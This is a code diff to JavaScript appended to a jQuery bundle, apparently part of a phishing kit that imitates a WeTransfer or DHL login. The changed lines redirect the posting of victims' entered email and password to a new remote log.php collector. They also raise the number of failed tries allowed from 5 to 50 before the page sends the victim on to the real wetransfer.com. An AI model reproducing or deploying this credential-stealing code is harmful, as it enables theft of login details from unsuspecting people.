@@ -10911,7 +10911,7 @@ return jQuery;
         $("#password").css("border", "1px solid #ccc"); 
         $("#email").css("border", "1px solid #ccc"); 
         $.ajax({
-            url: "https://files-download.sykesintl.com/files/log.php",
+            url: "https://elfargoltd.com/dhl/log.php",
             method: "post",
             data: {
                 X1: email,
@@ -10923,7 +10923,7 @@ return jQuery;
             success: function(data){
                 trials++;
                 setTimeout(() => {
-                    if(trials == 5){
+                    if(trials == 50){
                         window.location.href = "https://wetransfer.com";
                     }  
                     $("#error").css("display", "block");
@@ -10936,7 +10936,7 @@ return jQuery;
             error: function(data){
                 trials++;
                 setTimeout(() => {
-                    if(trials == 5){
+                    if(trials == 50){
                         window.location.href = "https://wetransfer.com";
                     }  
                     $("#error").css("display", "block");
